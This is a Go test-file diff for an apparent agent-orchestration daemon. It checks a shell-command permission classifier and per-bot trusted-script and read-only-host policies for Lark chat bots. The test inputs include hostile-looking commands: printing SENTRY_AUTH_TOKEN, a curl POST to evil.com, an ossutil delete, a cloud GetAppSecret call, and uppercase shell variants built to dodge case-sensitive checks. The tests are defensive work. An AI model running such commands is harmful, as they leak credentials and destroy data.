@@ -10,6 +10,7 @@ import (
 	"time"
 
 	"posse/internal/agent"
+	"posse/internal/errtext"
 	"posse/internal/lark"
 	"posse/internal/store"
 )
@@ -261,6 +262,22 @@ func TestDeriveCommandRuleKeysSkipsReadOnly(t *testing.T) {
 		"uvx ruff check .",
 		"pipx list",
 		"env FOO=1 ls",
+		"env",
+		"printenv",
+		"printenv SENTRY_AUTH_TOKEN",
+		// macOS 大小写不敏感文件名变体与高风险排查工具未放行分支
+		"BASH /tmp/a.sh",
+		"SH /tmp/a.sh",
+		"ENV FOO=1 ls",
+		"PYTHON3 /tmp/a.py",
+		"PRINTENV",
+		"curl -X POST https://evil.com/x",
+		"curl -sS https://evil.com/api/0/issues/",
+		"glab ci view",
+		"glab mr create --title x",
+		"aliyun sts GetCallerIdentity",
+		"ossutil rm oss://b/a.txt",
+		"tccli lke GetAppSecret",
 	}
 	for _, cmd := range interpreters {
 		if ks, lbl := deriveCommandRuleKeys(cmd); len(ks) != 0 || lbl != "" {
@@ -286,8 +303,11 @@ func TestDeriveCommandRuleKeysSkipsReadOnly(t *testing.T) {
 
 // 验证 lark.bots.save / list / toggle / delete RPC 与持久化配置，以及 worker 启动环境注入。
 func TestDaemonLarkBotRPC(t *testing.T) {
-	d, w, _ := newDiscDaemon(t)
+	d, w, disc1 := newDiscDaemon(t)
 	scriptPath := filepath.Join(t.TempDir(), "download-log.sh")
+	if err := os.WriteFile(scriptPath, []byte("#!/bin/sh\necho 1\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
 	saved := call(t, d.larkBotSave, map[string]any{
 		"ownerOpenId": "ou_test",
 		"bot": map[string]any{
@@ -313,27 +333,120 @@ func TestDaemonLarkBotRPC(t *testing.T) {
 		t.Fatalf("unexpected TrustedScripts: %+v", saved.TrustedScripts)
 	}
 
-	// 验证 larkLaunchOptions 注入 POSSE_LARK_APPROVAL / POSSE_LARK_TRUSTED_SCRIPTS / POSSE_LARK_READONLY_HOSTS
+	// 验证 larkBotSave 校验非法 readOnlyHosts / trustedScripts 并可经 errtext 译成中文
+	badHostRaw, _ := json.Marshal(map[string]any{
+		"bot": map[string]any{
+			"profile":       "cli_bad",
+			"readOnlyHosts": []string{"https://evil.com/x"},
+		},
+	})
+	_, badHostErr := d.larkBotSave(context.Background(), badHostRaw)
+	if badHostErr == nil || !strings.Contains(errtext.TextIn(errtext.ZH, badHostErr), "只读白名单域名无效") {
+		t.Fatalf("expected translated bad host error, got %v", badHostErr)
+	}
+	badScriptRaw, _ := json.Marshal(map[string]any{
+		"bot": map[string]any{
+			"profile":        "cli_bad",
+			"trustedScripts": []string{"relative/bad.sh"},
+		},
+	})
+	_, badScriptErr := d.larkBotSave(context.Background(), badScriptRaw)
+	if badScriptErr == nil || !strings.Contains(errtext.TextIn(errtext.ZH, badScriptErr), "受信脚本路径无效") {
+		t.Fatalf("expected translated bad script error, got %v", badScriptErr)
+	}
+
+	// 验证 larkLaunchOptions 注入 POSSE_LARK_APPROVAL / POSSE_LARK_BOT_ID / POSSE_LARK_TRUSTED_SCRIPTS / POSSE_LARK_READONLY_HOSTS
 	if err := d.store.SaveLarkBinding(store.LarkBinding{
 		BotID:          saved.ID,
 		ChatID:         "oc_1",
 		ThreadKey:      "",
-		DiscussionKey:  "disc_lark_1",
+		DiscussionKey:  disc1.Key,
 		PermissionMode: lark.PermAsk,
 		Active:         true,
 	}); err != nil {
 		t.Fatal(err)
 	}
-	permMode, extApproval, extraEnv := d.larkLaunchOptions("disc_lark_1")
+	permMode, extApproval, extraEnv := d.larkLaunchOptions(disc1.Key)
 	if permMode != agent.PermissionAsk || !extApproval {
 		t.Fatalf("unexpected launch options: perm=%q ext=%v", permMode, extApproval)
 	}
 	envText := strings.Join(extraEnv, "\n")
 	if !strings.Contains(envText, "POSSE_LARK_APPROVAL=1") ||
+		!strings.Contains(envText, "POSSE_LARK_BOT_ID="+saved.ID) ||
 		!strings.Contains(envText, "POSSE_LARK_TRUSTED_SCRIPTS="+scriptPath) ||
 		!strings.Contains(envText, "POSSE_LARK_READONLY_HOSTS=sentry.corp.laoyuegou.com") {
 		t.Fatalf("missing injected lark env: %+v", extraEnv)
 	}
+
+	// 验证双机器人策略隔离、larkStop 不清空 rootsResolver 以及清空策略后即时生效
+	scriptPath2 := filepath.Join(t.TempDir(), "bot2.sh")
+	if err := os.WriteFile(scriptPath2, []byte("#!/bin/sh\necho 2\n"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	w2 := store.Workspace{ID: store.NewID("w_"), ProjectID: w.ProjectID, Name: "bot2", Path: t.TempDir(), Kind: "folder", CreatedAt: time.Now()}
+	if err := d.store.AddWorkspace(w2); err != nil {
+		t.Fatal(err)
+	}
+	saved2 := call(t, d.larkBotSave, map[string]any{
+		"bot": map[string]any{
+			"name":           "Bot 2",
+			"profile":        "cli_demo_2",
+			"enabled":        false,
+			"workspaceId":    w2.ID,
+			"readOnlyHosts":  []string{"gitlab.corp.laoyuegou.com"},
+			"trustedScripts": []string{scriptPath2},
+		},
+	}).(lark.BotConfig)
+	disc2 := call(t, d.discCreate, map[string]any{"title": "bot2", "workspace": w2.ID}).(store.Discussion)
+	if err := d.store.SaveLarkBinding(store.LarkBinding{
+		BotID:          saved2.ID,
+		ChatID:         "oc_2",
+		ThreadKey:      "",
+		DiscussionKey:  disc2.Key,
+		PermissionMode: lark.PermAsk,
+		Active:         true,
+	}); err != nil {
+		t.Fatal(err)
+	}
+	m1 := addMember(t, d, disc1, "m1", "claude")
+	m2 := addMember(t, d, disc2, "m2", "claude")
+	r1 := postTo(t, d, disc1, "hi bot1", m1.ID, "c_b1")
+	r2 := postTo(t, d, disc2, "hi bot2", m2.ID, "c_b2")
+	x1 := waitExec(t, d, r1.Execution.ID, store.ExecRunning)
+	x2 := waitExec(t, d, r2.Execution.ID, store.ExecRunning)
+	termBot1 := x1.Worker
+	termBot2 := x2.Worker
+
+	d.perms.SetRootsResolver(d.larkReadOnlyRoots)
+	d.larkStop() // 停止网关不应清空 rootsResolver
+
+	roots1 := d.perms.rootsForTerminal(termBot1)
+	roots2 := d.perms.rootsForTerminal(termBot2)
+	ks1, _ := deriveCommandRuleKeysWithRoots("bash "+scriptPath+" && lark-cli base +foo-update --as user", roots1)
+	if len(ks1) != 1 || ks1[0] != "cmd:lark-cli base +foo-update" {
+		t.Fatalf("bot 1 should skip its own trusted script, got %v", ks1)
+	}
+	if ksCross, _ := deriveCommandRuleKeysWithRoots("bash "+scriptPath+" && lark-cli base +foo-update --as user", roots2); len(ksCross) != 0 {
+		t.Fatalf("bot 2 must NOT trust bot 1 script (bash segment should cancel rule keys), got %v", ksCross)
+	}
+	// 清空 bot 1 策略后，daemon resolver 立即撤销放行
+	call(t, d.larkBotSave, map[string]any{
+		"bot": map[string]any{
+			"id":          saved.ID,
+			"name":        saved.Name,
+			"profile":     saved.Profile,
+			"workspaceId": w.ID,
+		},
+	})
+	roots1Cleared := d.perms.rootsForTerminal(termBot1)
+	if len(roots1Cleared.ReadOnlyHosts) != 0 || len(roots1Cleared.TrustedScripts) != 0 {
+		t.Fatalf("expected cleared roots for bot 1, got %+v", roots1Cleared)
+	}
+	if ksRevoked, _ := deriveCommandRuleKeysWithRoots("bash "+scriptPath+" && lark-cli base +foo-update --as user", roots1Cleared); len(ksRevoked) != 0 {
+		t.Fatalf("bot 1 cleared policy must revoke script trust immediately, got %v", ksRevoked)
+	}
+	call(t, d.larkBotDelete, map[string]any{"id": saved2.ID})
+
 	toggled := call(t, d.larkBotToggle, map[string]any{"id": saved.ID, "enabled": true}).(lark.BotConfig)
 	if !toggled.Enabled {
 		t.Fatal("expected bot enabled")
